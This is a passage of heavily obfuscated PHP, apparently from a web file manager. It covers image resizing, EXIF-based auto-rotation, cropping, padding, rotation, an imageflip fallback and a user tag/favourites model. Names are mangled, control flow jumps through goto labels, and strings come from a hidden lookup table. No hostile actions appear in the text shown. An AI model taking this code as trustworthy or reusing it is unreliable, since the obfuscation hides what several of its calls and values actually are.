$CäˆÛ™öŞï * ($this->srcW / $this->srcH); } if ($this->srcW > $EÁòÃ¼¦ï || $this->srcH > $dÂÕÉ—–Á´) { $a¹øŞ…ç½ = $this->creatImage($this->im, $DÛ¬ùõÉáÌ, $CäˆÛ™öŞï, 0, 0, 0, 0, $this->srcW, $this->srcH); } else { $a¹øŞ…ç½ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); } $a¹øŞ…ç½ = $this->autoRotate($a¹øŞ…ç½); return $this->echoImage($a¹øŞ…ç½, $Bã¡İ‰‡­İ); } private function autoRotate($F“¯µ­ŠŞ¤) { goto C…Éï‡°Û¦; C…Éï‡°Û¦: $Cé“º‹Õù‰ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$F“¯µ­ŠŞ¤ || !function_exists($Cé“º‹Õù‰[1900])) { return $F“¯µ­ŠŞ¤; } $dĞòˆÄ÷É¯ = exif_read_data($this->srcFile); goto a¸®ÈÌáŒ°; a¸®ÈÌáŒ°: if (!$dĞòˆÄ÷É¯ || !isset($dĞòˆÄ÷É¯[$Cé“º‹Õù‰[1901]]) || $dĞòˆÄ÷É¯[$Cé“º‹Õù‰[1901]] == 1) { return $F“¯µ­ŠŞ¤; } $a×öŒˆÃ‹½ = 0; if ($dĞòˆÄ÷É¯[$Cé“º‹Õù‰[1901]] == 6) { $a×öŒˆÃ‹½ = 90; } goto eÌó×ëíŠ‡; eÌó×ëíŠ‡: if ($dĞòˆÄ÷É¯[$Cé“º‹Õù‰[1901]] == 8) { $a×öŒˆÃ‹½ = 270; } if ($dĞòˆÄ÷É¯[$Cé“º‹Õù‰[1901]] == 3) { $a×öŒˆÃ‹½ = 180; } return $this->rotateDegree($F“¯µ­ŠŞ¤, $a×öŒˆÃ‹½); goto c¡’¶¤Ç¨; c¡’¶¤Ç¨: } private function rotateDegree($f¤ñêøİàª, $F¤äÌŒÉğÌ) { if (!$f¤ñêøİàª || $F¤äÌŒÉğÌ % 360 === 0 || !function_exists($_SERVER[åÌÛ»ô¢‚ö™][1902])) { return $f¤ñêøİàª; } $A‰ä½æ ƒí = imageRotate($f¤ñêøİàª, 360 - $F¤äÌŒÉğÌ, 0); imageDestroy($f¤ñêøİàª); return $A‰ä½æ ƒí ? $A‰ä½æ ƒí : $f¤ñêøİàª; } function cut($A¶‘Ÿ‘ô”‘, $a†ÓŸ††ĞØ, $f‹®¡È•Ğô) { goto CŠí‰Èƒµ; CŠí‰Èƒµ: $aµŸã¨‚ĞÄ = $a†ÓŸ††ĞØ / $f‹®¡È•Ğô; $FØÅó¦²äÅ = $this->srcW / $this->srcH; if ($aµŸã¨‚ĞÄ <= $FØÅó¦²äÅ) { $eÆÂ“à„â  = $f‹®¡È•Ğô; $C¼ÂÌ®§°Ş = $eÆÂ“à„â  * ($this->srcW / $this->srcH); } else { $C¼ÂÌ®§°Ş = $a†ÓŸ††ĞØ; $eÆÂ“à„â  = $C¼ÂÌ®§°Ş * ($this->srcH / $this->srcW); } goto BÔ§è²Æ¼˜; BÔ§è²Æ¼˜: $e¨‰Ê‚™À = $this->creatImage($this->im, $C¼ÂÌ®§°Ş, $eÆÂ“à„â , 0, 0, 0, 0, $this->srcW, $this->srcH); $Fõ³ó®ŒÖ = $this->creatImage($e¨‰Ê‚™À, $a†ÓŸ††ĞØ, $f‹®¡È•Ğô, 0, 0, ($C¼ÂÌ®§°Ş - $a†ÓŸ††ĞØ) / 2, ($eÆÂ“à„â  - $f‹®¡È•Ğô) / 2, $a†ÓŸ††ĞØ, $f‹®¡È•Ğô); imageDestroy($e¨‰Ê‚™À); goto eÇ¾„åè½ ; eÇ¾„åè½ : return $this->echoImage($Fõ³ó®ŒÖ, $A¶‘Ÿ‘ô”‘); goto DÙŸ¦¿ß´‹; DÙŸ¦¿ß´‹: } function backFill($D«„©Û©é, $e³—óæÍÇÒ, $f«Æó‹©ğØ, $DË œÜøº = false, $BÌØÈíˆ = 255, $Cñ•¬ŞÑ‘Õ = 255, $AÅ‰ƒíÌƒ‰ = 255) { goto fÖà™ª…˜Å; fÖà™ª…˜Å: $AÃÚÇ‰¦À = $e³—óæÍÇÒ / $f«Æó‹©ğØ; $fƒŠø¶Àî‘ = $this->srcW / $this->srcH; if ($AÃÚÇ‰¦À <= $fƒŠø¶Àî‘) { $Fç¢…‰®â° = $e³—óæÍÇÒ; $BÕ èÓœŠÁ = $Fç¢…‰®â° * ($this->srcH / $this->srcW); } else { $BÕ èÓœŠÁ = $f«Æó‹©ğØ; $Fç¢…‰®â° = $BÕ èÓœŠÁ * ($this->srcW / $this->srcH); } goto aÅ¬ÛäÉ†Ê; fĞÅ›°•¯: if ($DË œÜøº) { $añ¤§Š–¦ = imageColorTransparent($EÃ××Ã‹”¼, $añ¤§Š–¦); $a‹±–ƒô† = $f«Æó‹©ğØ - $BÕ èÓœŠÁ; } imageFilledRectangle($EÃ××Ã‹”¼, 0, 0, $e³—óæÍÇÒ, $f«Æó‹©ğØ, $añ¤§Š–¦); if ($this->srcW > $e³—óæÍÇÒ || $this->srcH > $f«Æó‹©ğØ) { $c‘âÁ‰î‰ë = $this->creatImage($this->im, $Fç¢…‰®â°, $BÕ èÓœŠÁ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($Fç¢…‰®â° < $e³—óæÍÇÒ) { imageCopy($EÃ××Ã‹”¼, $c‘âÁ‰î‰ë, ($e³—óæÍÇÒ - $Fç¢…‰®â°) / 2, 0, 0, 0, $Fç¢…‰®â°, $BÕ èÓœŠÁ); } else { if ($BÕ èÓœŠÁ < $f«Æó‹©ğØ) { imageCopy($EÃ××Ã‹”¼, $c‘âÁ‰î‰ë, 0, $a‹±–ƒô†, 0, 0, $Fç¢…‰®â°, $BÕ èÓœŠÁ); } else { imageCopy($EÃ××Ã‹”¼, $c‘âÁ‰î‰ë, 0, 0, 0, 0, $Fç¢…‰®â°, $BÕ èÓœŠÁ); } } } else { imageCopyMerge($EÃ××Ã‹”¼, $this->im, ($e³—óæÍÇÒ - $Fç¢…‰®â°) / 2, $a‹±–ƒô†, 0, 0, $Fç¢…‰®â°, $BÕ èÓœŠÁ, 100); } goto CÌ¯ÍÍŸ¡‚; CÌ¯ÍÍŸ¡‚: return $this->echoImage($EÃ××Ã‹”¼, $D«„©Û©é); goto bªà½­ŒŞ; aÅ¬ÛäÉ†Ê: if (function_exists($_SERVER[åÌÛ»ô¢‚ö™][1903])) { @($EÃ××Ã‹”¼ = imageCreateTrueColor($e³—óæÍÇÒ, $f«Æó‹©ğØ)); if (!$EÃ××Ã‹”¼) { $EÃ××Ã‹”¼ = imageCreate($e³—óæÍÇÒ, $f«Æó‹©ğØ); } } else { $EÃ××Ã‹”¼ = imageCreate($e³—óæÍÇÒ, $f«Æó‹©ğØ); } $a‹±–ƒô† = ($f«Æó‹©ğØ - $BÕ èÓœŠÁ) / 2; $añ¤§Š–¦ = imagecolorallocate($EÃ××Ã‹”¼, $BÌØÈíˆ, $Cñ•¬ŞÑ‘Õ, $AÅ‰ƒíÌƒ‰); goto fĞÅ›°•¯; bªà½­ŒŞ: } function creatImage($cá÷¿‚¾»õ, $Dß‰í‹µ½, $FÄ›™ÆˆĞë, $b«äºßÅ­½, $EÙ¤­—†ó®, $d¹²˜£™», $a¼ÊÇÇ±ğá, $AŒ„ÜÀ‚×„, $e‹´ç‰ÏŠ‰) { if (function_exists($_SERVER[åÌÛ»ô¢‚ö™][1903])) { @($aŒùƒÆÂ±— = ImageCreateTrueColor($Dß‰í‹µ½, $FÄ›™ÆˆĞë)); @imagealphablending($aŒùƒÆÂ±—, !1); @imagesavealpha($aŒùƒÆÂ±—, !0); if ($aŒùƒÆÂ±—) { imageCopyResampled($aŒùƒÆÂ±—, $cá÷¿‚¾»õ, $b«äºßÅ­½, $EÙ¤­—†ó®, $d¹²˜£™», $a¼ÊÇÇ±ğá, $Dß‰í‹µ½, $FÄ›™ÆˆĞë, $AŒ„ÜÀ‚×„, $e‹´ç‰ÏŠ‰); } else { $aŒùƒÆÂ±— = ImageCreate($Dß‰í‹µ½, $FÄ›™ÆˆĞë); imageCopyResized($aŒùƒÆÂ±—, $cá÷¿‚¾»õ, $b«äºßÅ­½, $EÙ¤­—†ó®, $d¹²˜£™», $a¼ÊÇÇ±ğá, $Dß‰í‹µ½, $FÄ›™ÆˆĞë, $AŒ„ÜÀ‚×„, $e‹´ç‰ÏŠ‰); } } else { $aŒùƒÆÂ±— = ImageCreate($Dß‰í‹µ½, $FÄ›™ÆˆĞë); imageCopyResized($aŒùƒÆÂ±—, $cá÷¿‚¾»õ, $b«äºßÅ­½, $EÙ¤­—†ó®, $d¹²˜£™», $a¼ÊÇÇ±ğá, $Dß‰í‹µ½, $FÄ›™ÆˆĞë, $AŒ„ÜÀ‚×„, $e‹´ç‰ÏŠ‰); } return $aŒùƒÆÂ±—; } public function imgRotate($C½Ø˜ºÖ¯‹, $f™äÊ¾“Ì) { goto d¡‹ö×Ä‚¬; d¡‹ö×Ä‚¬: if (!$this->im || $f™äÊ¾“Ì % 360 === 0 || !function_exists($_SERVER[åÌÛ»ô¢‚ö™][1902])) { return !1; } $DùÀá·é¶¹ = imageRotate($this->im, 360 - $f™äÊ¾“Ì, 0); $cŒ–ÚÅÑğô = !1; goto dĞƒØ•¥®Ü; cä«§¬åïØ: return $cŒ–ÚÅÑğô; goto Aôºˆ’¹†÷; dĞƒØ•¥®Ü: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $cŒ–ÚÅÑğô = imagegif($DùÀá·é¶¹, $C½Ø˜ºÖ¯‹); break; case IMAGETYPE_JPEG: $cŒ–ÚÅÑğô = imagejpeg($DùÀá·é¶¹, $C½Ø˜ºÖ¯‹, 100); break; case IMAGETYPE_PNG: $cŒ–ÚÅÑğô = imagePNG($DùÀá·é¶¹, $C½Ø˜ºÖ¯‹); break; default: break; } imageDestroy($DùÀá·é¶¹); imageDestroy($this->im); goto cä«§¬åïØ; Aôºˆ’¹†÷: } function echoImage($FÙÍÅÍÙè, $dÀƒÛØîÜ) { goto D§¨ìˆ´¬ª; aºôãÔÈ«¯: imageDestroy($FÙÍÅÍÙè); imageDestroy($this->im); return $F–›ĞçÓîÔ; goto Dàë§Œìî; D§¨ìˆ´¬ª: $bôƒÏƒÏ£© =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$FÙÍÅÍÙè) { return !1; } ob_get_clean(); goto fù’«ˆ”©; fù’«ˆ”©: $F–›ĞçÓîÔ = !1; $A†¯íÍ¾Š« = 90; switch ($this->echoType) { case $bôƒÏƒÏ£©[1904]: $F–›ĞçÓîÔ = imagejpeg($FÙÍÅÍÙè, null, $A†¯íÍ¾Š«); break; case $bôƒÏƒÏ£©[171]: $F–›ĞçÓîÔ = imagejpeg($FÙÍÅÍÙè, $dÀƒÛØîÜ, $A†¯íÍ¾Š«); break; } goto aºôãÔÈ«¯; Dàë§Œìî: } } if (!function_exists($_SERVER[åÌÛ»ô¢‚ö™][1905])) { define($_SERVER[åÌÛ»ô¢‚ö™][1906], 0); define($_SERVER[åÌÛ»ô¢‚ö™][1907], 1); define($_SERVER[åÌÛ»ô¢‚ö™][1908], 2); function imageflip($dâÃ·½¦ší, $Aê¤œ”ä·) { switch ($Aê¤œ”ä·) { case IMG_FLIP_HORIZONTAL: $bÎåçèãó• = imagesx($dâÃ·½¦ší) - 1; $f¾¿³›ˆæÎ = $bÎåçèãó• / 2; $E”®Í×ùéÆ = imagesy($dâÃ·½¦ší); $fÒ×˜×Ûó = imageistruecolor($dâÃ·½¦ší) ? imagecreatetruecolor(1, $E”®Í×ùéÆ) : imagecreate(1, $E”®Í×ùéÆ); for ($D’Ù±À»¤ = 0; $D’Ù±À»¤ < $f¾¿³›ˆæÎ; ++$D’Ù±À»¤) { imagecopy($fÒ×˜×Ûó, $dâÃ·½¦ší, 0, 0, $D’Ù±À»¤, 0, 1, $E”®Í×ùéÆ); imagecopy($dâÃ·½¦ší, $dâÃ·½¦ší, $D’Ù±À»¤, 0, $bÎåçèãó• - $D’Ù±À»¤, 0, 1, $E”®Í×ùéÆ); imagecopy($dâÃ·½¦ší, $fÒ×˜×Ûó, $bÎåçèãó• - $D’Ù±À»¤, 0, 0, 0, 1, $E”®Í×ùéÆ); } break; case IMG_FLIP_VERTICAL: $F¯Ì¸µÎ†Ë = imagesx($dâÃ·½¦ší); $F±¶ÚÌ ¨Û = imagesy($dâÃ·½¦ší) - 1; $e±¡È‹ˆ¶Ë = $F±¶ÚÌ ¨Û / 2; $fÒ×˜×Ûó = imageistruecolor($dâÃ·½¦ší) ? imagecreatetruecolor($F¯Ì¸µÎ†Ë, 1) : imagecreate($F¯Ì¸µÎ†Ë, 1); for ($E‘»×¡Š = 0; $E‘»×¡Š < $e±¡È‹ˆ¶Ë; ++$E‘»×¡Š) { imagecopy($fÒ×˜×Ûó, $dâÃ·½¦ší, 0, 0, 0, $E‘»×¡Š, $F¯Ì¸µÎ†Ë, 1); imagecopy($dâÃ·½¦ší, $dâÃ·½¦ší, 0, $E‘»×¡Š, 0, $F±¶ÚÌ ¨Û - $E‘»×¡Š, $F¯Ì¸µÎ†Ë, 1); imagecopy($dâÃ·½¦ší, $fÒ×˜×Ûó, 0, $F±¶ÚÌ ¨Û - $E‘»×¡Š, 0, 0, $F¯Ì¸µÎ†Ë, 1); } break; case IMG_FLIP_BOTH: $F¯Ì¸µÎ†Ë = imagesx($dâÃ·½¦ší); $E”®Í×ùéÆ = imagesy($dâÃ·½¦ší); $fÒ×˜×Ûó = imagerotate($dâÃ·½¦ší, 180, 0); imagecopy($dâÃ·½¦ší, $fÒ×˜×Ûó, 0, 0, 0, 0, $F¯Ì¸µÎ†Ë, $E”®Í×ùéÆ); break; default: return; } imagedestroy($fÒ×˜×Ûó); } } goto e•ˆ©±…„©; dàÈæÙ–: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($DƒòÎ¬í•Ç) { $C»±·÷ËÑø =& $_SERVER[åÌÛ»ô¢‚ö™]; return array($C»±·÷ËÑø[2234] => array(USER_ID, $C»±·÷ËÑø[2235])); } protected function listData() { $a˜Òô³¯Ì =& $_SERVER[åÌÛ»ô¢‚ö™]; $B”Ãäêçß = array($a˜Òô³¯Ì[1457] => USER_ID, $a˜Òô³¯Ì[460] => array($a˜Òô³¯Ì[2238], 0)); $fË…àš×¬¶ = $a˜Òô³¯Ì[2240]; $FÕê›ù˜ÍÕ = $this->field($fË…àš×¬¶)->where($B”Ãäêçß)->order($a˜Òô³¯Ì[2241])->select(); return $FÕê›ù˜ÍÕ ? $FÕê›ù˜ÍÕ : array(); } protected function listByTag($d¸š¹‡åöÌ) { } protected function addToTag($féÁƒŠËË, $c²ÔÓº£®¶) { $a½„‡–™Ëì =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!Model($a½„‡–™Ëì[2376])->listData($c²ÔÓº£®¶) || !Model($a½„‡–™Ëì[778])->pathInfo($féÁƒŠËË)) { return !1; } $dñŒ¢†›¢ˆ = array($a½„‡–™Ëì[1457] => USER_ID, $a½„‡–™Ëì[460] => $c²ÔÓº£®¶, $a½„‡–™Ëì[412] => $féÁƒŠËË, $a½„‡–™Ëì[413] => $a½„‡–™Ëì[407], $a½„‡–™Ëì[411] => $a½„‡–™Ëì[33], $a½„‡–™Ëì[2142] => 0); if ($this->where($dñŒ¢†›¢ˆ)->find()) { return !1; } return $this->add($dñŒ¢†›¢ˆ); } protected function removeFromTag($cÛ¿ ìãÎÉ, $Dƒ÷±ÃßÛ) { $aÒ‡îĞåŸ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!Model($aÒ‡îĞåŸ[2376])->listData($Dƒ÷±ÃßÛ)) { return !1; } if (is_array($cÛ¿ ìãÎÉ)) { $cÛ¿ ìãÎÉ = array($aÒ‡îĞåŸ[7], $cÛ¿ ìãÎÉ); } $CŸ’ŸÑØ¾· = array($aÒ‡îĞåŸ[1457] => USER_ID, $aÒ‡îĞåŸ[460] => $Dƒ÷±ÃßÛ, $aÒ‡îĞåŸ[413] => $aÒ‡îĞåŸ[407], $aÒ‡îĞåŸ[412] => $cÛ¿ ìãÎÉ); return $this->where($CŸ’ŸÑØ¾·)->delete(); } protected function removeByTag($EŸôÃš…¹Ì) { $DŒ½­Œã”Õ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (!$EŸôÃš…¹Ì) { return !1; } $cì›†ÃË†… = array($DŒ½­Œã”Õ[1457] => USER_ID, $DŒ½­Œã”Õ[460] => $EŸôÃš…¹Ì); return $this->where($cì›†ÃË†…)->delete(); } protected function removeBySource($EæõÕ½) { $c¹·²ê¨Ë =& $_SERVER[åÌÛ»ô¢‚ö™]; if (is_array($EæõÕ½)) { $EæõÕ½ = array($c¹·²ê¨Ë[7], $EæõÕ½); } $Dœæ¨­èöÜ = array($c¹·²ê¨Ë[1457] => USER_ID, $c¹·²ê¨Ë[412] => $EæõÕ½, $c¹·²ê¨Ë[460] => array($c¹·²ê¨Ë[949], 0)); return $this->where($Dœæ¨­èöÜ)->delete(); } }